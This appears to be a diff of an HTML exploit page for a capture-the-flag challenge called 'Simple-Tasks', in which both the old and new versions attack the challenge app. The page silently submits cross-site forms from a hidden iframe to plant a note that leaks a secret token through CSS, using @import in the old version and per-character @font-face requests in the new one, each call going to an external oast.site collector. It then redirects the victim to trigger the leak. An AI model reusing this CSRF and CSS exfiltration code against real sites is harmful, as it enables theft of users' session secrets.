@@ -1,43 +1,36 @@
 <!DOCTYPE html>
 <meta charset="utf-8">
-<title>Simple-Tasks PoC</title>
+<title>Simple-Tasks helper</title>
+<iframe name="bg" style="display:none"></iframe>
+
 <script>
-/* ---------------------------------------------------------------
-   CONFIG SECTION
----------------------------------------------------------------- */
-const CHAL_ORIGIN  = "http://localhost:80";         // <-- adjust
-const OUR_COLLECTOR = "https://xng98z0ayh4xm2rgego9xm8k01jdbfi72.oast.site/leak";   // <-- adjust
+/* ======== CHANGE THESE TWO LINES ======== */
+const CHAL  = "http://localhost:80";      // challenge origin
+const OAST  = "https://xng98z0ayh4xm2rgego9xm8k01jdbfi72.oast.site";  // your Caido sub-domain
+/* ========================================= */
 
-/* Your no-JS payload – it will run inside /tasks/preview */
-const PAYLOAD = `
-<meta http-equiv="refresh"
-      content="0;url=https://xng98z0ayh4xm2rgego9xm8k01jdbfi72.oast.site?t={{{}}}">
-<style>
-  /* CSS-exfil sends one request per hex nibble in the token */
-  @import url("https://xng98z0ayh4xm2rgego9xm8k01jdbfi72.oast.site?c=" attr(data-token string));
-</style>`;
+/* 1️⃣  create list 0 so token note shifts to 1/0 */
+const f1 = document.createElement("form");
+f1.method = "POST"; f1.target = "bg";
+f1.action = CHAL + "/tasks/create";
+document.body.appendChild(f1); f1.submit();
 
-/* ---------------------------------------------------------------
-   EXPLOIT FLOW
-   1) ensure Task 0 exists
-   2) POST the malicious note into it
-   3) open the preview so the note executes
----------------------------------------------------------------- */
-(async () => {
-  try {
-    /* 1 — create Task 0 (harmless if it already exists) */
-    await fetch(CHAL_ORIGIN + "/tasks/create",
-                {method: "POST", credentials: "include"});
+/* 2️⃣  upload the CSS-exfil note into 0/0 */
+const hex = "0123456789abcdef";
+let css = "";
+for (const c of hex) {
+  css += `@font-face{font-family:x${c};src:url(${OAST}/leak?d=${c});
+           unicode-range:U+${c.charCodeAt(0).toString(16)}}`;
+}
+const note = `<style>${css}</style><div style="font-family:${[...hex].map(c=>"x"+c).join(",")}">justToken{PLACEHOLDER}</div>`;
 
-    /* 2 — add our payload as the first note in Task 0          */
-    const body = new URLSearchParams({content: PAYLOAD});
-    await fetch(CHAL_ORIGIN + "/tasks/0",
-                {method: "POST", body, credentials: "include"});
+const f2 = document.createElement("form");
+f2.method = "POST"; f2.target = "bg";
+f2.action = CHAL + "/tasks/0";
+f2.innerHTML = `<input name="content" value="${note.replace(/"/g,"&quot;")}">`;
+setTimeout(()=>{document.body.appendChild(f2);f2.submit();}, 400);
 
-    /* 3 — open the raw preview (script-free CSP)                */
-    location.href = CHAL_ORIGIN + "/tasks/preview/0/0";
-  } catch (e) {
-    console.error("Exploit failed:", e);
-  }
-})();
+/* 3️⃣  finally view the token note */
+setTimeout(()=>location.href = CHAL + "/tasks/preview/1/0", 800);
 </script>
+
